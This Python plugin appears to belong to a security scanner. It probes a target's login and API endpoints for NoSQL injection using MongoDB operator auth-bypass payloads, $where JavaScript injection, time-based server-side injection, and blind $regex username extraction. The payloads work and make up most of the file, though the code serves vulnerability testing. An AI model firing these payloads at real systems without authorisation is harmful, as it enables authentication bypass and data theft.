# plugins/nosql_scanner.py — Cascavel 2026 Intelligence
import json as _json
import time

import requests

ENDPOINTS = [
    "/api/login",
    "/login",
    "/api/auth",
    "/auth",
    "/api/users",
    "/api/v1/login",
    "/api/v1/auth",
    "/api/search",
    "/api/v1/users",
    "/api/v1/search",
    "/api/v1/products",
    "/api/account",
    "/api/v2/login",
    "/api/v2/auth",
    "/graphql",
    "/api/profile",
    "/api/admin",
    "/api/register",
    "/api/reset-password",
]

SUCCESS_INDICATORS = [
    "token",
    "session",
    "welcome",
    "dashboard",
    "success",
    "jwt",
    "logged",
    "authenticated",
    "user_id",
    "access_token",
    "refresh_token",
]

# ──────────── AUTH BYPASS (MongoDB Operator Injection) ────────────
AUTH_PAYLOADS = [
    ({"username": {"$ne": ""}, "password": {"$ne": ""}}, "NE_BYPASS"),
    ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "GT_BYPASS"),
    ({"username": {"$exists": True}, "password": {"$exists": True}}, "EXISTS_BYPASS"),
    ({"username": "admin", "password": {"$regex": ".*"}}, "REGEX_WILDCARD"),
    ({"username": {"$in": ["admin", "administrator", "root", "test"]}, "password": {"$ne": ""}}, "IN_BYPASS"),
    ({"username": {"$nin": ["nonexistent"]}, "password": {"$nin": [""]}}, "NIN_BYPASS"),
    ({"username": {"$lt": "z"}, "password": {"$lt": "z"}}, "LT_BYPASS"),
    # Type coercion
    ({"username": {"$type": 2}, "password": {"$ne": ""}}, "TYPE_COERCE"),
    # OR injection
    ({"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}, "OR_INJECTION"),
]

# ──────────── GET PARAMETER INJECTION ────────────
GET_PAYLOADS = [
    ("[$ne]=1", "GET_NE"),
    ("[$gt]=", "GET_GT"),
    ("[$regex]=.*", "GET_REGEX"),
    ("[$exists]=true", "GET_EXISTS"),
    ("[$nin][]=", "GET_NIN"),
    ("[$lt]=z", "GET_LT"),
    # Nested operator injection
    ("[password][$ne]=", "GET_NESTED_NE"),
    ("[password][$gt]=", "GET_NESTED_GT"),
]

# ──────────── $where JavaScript Injection ────────────
WHERE_PAYLOADS = [
    ({"$where": "function() { return true; }"}, "WHERE_FUNC_TRUE"),
    ({"$where": "1==1"}, "WHERE_1EQ1"),
    ({"$where": "this.username == 'admin'"}, "WHERE_ADMIN"),
    # Constructor access
    ({"$where": "this.constructor.constructor('return true')()"}, "WHERE_CONSTRUCTOR"),
]

# ──────────── $where TIME-BASED (SSJI) ────────────
SSJI_TIME_PAYLOADS = [
    ({"$where": "sleep(5000)"}, "SSJI_SLEEP", 4.0),
    (
        {"$where": "function() { var x = new Date(); while(new Date() - x < 5000); return true; }"},
        "SSJI_BUSY_WAIT",
        4.0,
    ),
    ({"$where": "(function(){var d=new Date();while(new Date()-d<5000){}return true;})()"}, "SSJI_IIFE_WAIT", 4.0),
]

# ──────────── BLIND BOOLEAN EXTRACTION ────────────
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"


def _test_auth_bypass(target, endpoint):
    """Testa auth bypass via operadores MongoDB."""
    vulns = []
    url = f"http://{target}{endpoint}"
    for payload, method in AUTH_PAYLOADS:
        try:
            resp = requests.post(
                url,
                json=payload,
                timeout=6,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code == 200 and any(k in resp.text.lower() for k in SUCCESS_INDICATORS):
                vulns.append(
                    {
                        "tipo": "NOSQL_AUTH_BYPASS",
                        "metodo": method,
                        "endpoint": endpoint,
                        "severidade": "CRITICO",
                        "descricao": f"Auth bypass via {method}!",
                        "amostra": resp.text[:200],
                    }
                )
                break
        except Exception:
            continue
    return vulns


def _test_get_injection(target, endpoint):
    """Testa NoSQL injection via GET parameters."""
    vulns = []
    for suffix, method in GET_PAYLOADS:
        try:
            resp = requests.get(f"http://{target}{endpoint}?username{suffix}&password{suffix}", timeout=5)
            if resp.status_code == 200 and len(resp.text) > 100:
                vulns.append(
                    {
                        "tipo": "NOSQL_GET_INJECTION",
                        "metodo": method,
                        "endpoint": endpoint,
                        "severidade": "ALTO",
                    }
                )
                break
        except Exception:
            continue
    return vulns


def _test_where_injection(target, endpoint):
    """Testa $where JavaScript injection (boolean + time-based)."""
    vulns = []
    url = f"http://{target}{endpoint}"

    # Boolean-based $where
    for payload, method in WHERE_PAYLOADS:
        try:
            resp = requests.post(
                url,
                json=payload,
                timeout=8,
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code == 200 and len(resp.text) > 50:
                vulns.append(
                    {
                        "tipo": "NOSQL_WHERE_INJECTION",
                        "metodo": method,
                        "endpoint": endpoint,
                        "severidade": "ALTO",
                    }
                )
        except Exception:
            continue

    # Time-based SSJI
    for payload, method, threshold in SSJI_TIME_PAYLOADS:
        try:
            start = time.time()
            requests.post(
                url,
                json=payload,
                timeout=12,
                headers={"Content-Type": "application/json"},
            )
            elapsed = time.time() - start
            if elapsed > threshold:
                vulns.append(
                    {
                        "tipo": "NOSQL_SSJI",
                        "metodo": method,
                        "endpoint": endpoint,
                        "severidade": "CRITICO",
                        "tempo": round(elapsed, 2),
                        "descricao": "Server-Side JavaScript Injection via $where (time-based)!",
                    }
                )
                break
        except requests.Timeout:
            vulns.append(
                {
                    "tipo": "NOSQL_SSJI_TIMEOUT",
                    "metodo": method,
                    "endpoint": endpoint,
                    "severidade": "ALTO",
                }
            )
            break
        except Exception:
            continue

    return vulns


def _test_blind_boolean(target, endpoint):
    """Testa blind boolean NoSQL injection via $regex."""
    url = f"http://{target}{endpoint}"
    try:
        r_true = requests.post(
            url,
            json={"username": {"$regex": "^a"}, "password": {"$ne": ""}},
            timeout=5,
            headers={"Content-Type": "application/json"},
        )
        r_false = requests.post(
            url,
            json={"username": {"$regex": "^ZZZZZZ"}, "password": {"$ne": ""}},
            timeout=5,
            headers={"Content-Type": "application/json"},
        )
        if len(r_true.text) != len(r_false.text) or r_true.status_code != r_false.status_code:
            # Try to extract first 3 chars of username
            extracted = ""
            for _pos in range(3):
                for char in CHARSET:
                    probe = {"username": {"$regex": f"^{extracted}{char}"}, "password": {"$ne": ""}}
                    resp = requests.post(url, json=probe, timeout=4, headers={"Content-Type": "application/json"})
                    if len(resp.text) == len(r_true.text):
                        extracted += char
                        break
            return {
                "tipo": "NOSQL_BLIND_BOOLEAN",
                "endpoint": endpoint,
                "severidade": "ALTO",
                "descricao": "Blind boolean NoSQL injection detectada!",
                "username_prefix_extraido": extracted if extracted else "não extraído",
            }
    except Exception:
        pass
    return None


def _test_content_type_bypass(target, endpoint):
    """Testa NoSQL injection quando Content-Type não é validado."""
    payloads_str = [
        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        "username[$ne]=&password[$ne]=",
    ]
    content_types = [
        "text/plain",
        "application/x-www-form-urlencoded",
    ]
    for payload, ct in zip(payloads_str, content_types):
        try:
            resp = requests.post(
                f"http://{target}{endpoint}",
                data=payload,
                timeout=5,
                headers={"Content-Type": ct},
            )
            if resp.status_code == 200 and any(k in resp.text.lower() for k in SUCCESS_INDICATORS):
                return {
                    "tipo": "NOSQL_CONTENT_TYPE_BYPASS",
                    "endpoint": endpoint,
                    "severidade": "CRITICO",
                    "content_type": ct,
                    "descricao": f"NoSQL injection via Content-Type bypass ({ct})!",
                }
        except Exception:
            continue
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner NoSQL Injection 2026-Grade — MongoDB/CouchDB.

    Técnicas: 9 auth bypass payloads ($ne/$gt/$exists/$regex/$in/$nin/$lt/$type/$or),
    8 GET parameter injection, $where JavaScript injection (boolean + constructor),
    SSJI time-based (sleep/busy-wait/IIFE), blind boolean extraction com
    $regex char-by-char enumeration, Content-Type bypass (text/plain → JSON parse).
    19 endpoints testados.
    """
    _ = (ip, open_ports, banners, _json)
    vulns = []

    for ep in ENDPOINTS:
        # 1. Auth bypass
        vulns.extend(_test_auth_bypass(target, ep))

        # 2. GET parameter injection
        vulns.extend(_test_get_injection(target, ep))

        # 3. $where injection (boolean + time-based SSJI)
        vulns.extend(_test_where_injection(target, ep))

        # 4. Blind boolean extraction
        blind = _test_blind_boolean(target, ep)
        if blind:
            vulns.append(blind)

        # 5. Content-Type bypass
        ct_vuln = _test_content_type_bypass(target, ep)
        if ct_vuln:
            vulns.append(ct_vuln)

    return {
        "plugin": "nosql_scanner",
        "versao": "2026.1",
        "tecnicas": [
            "auth_bypass",
            "operator_injection",
            "where_ssji",
            "blind_boolean",
            "regex_extraction",
            "content_type_bypass",
        ],
        "resultados": vulns if vulns else "Nenhuma NoSQL injection detectada",
    }
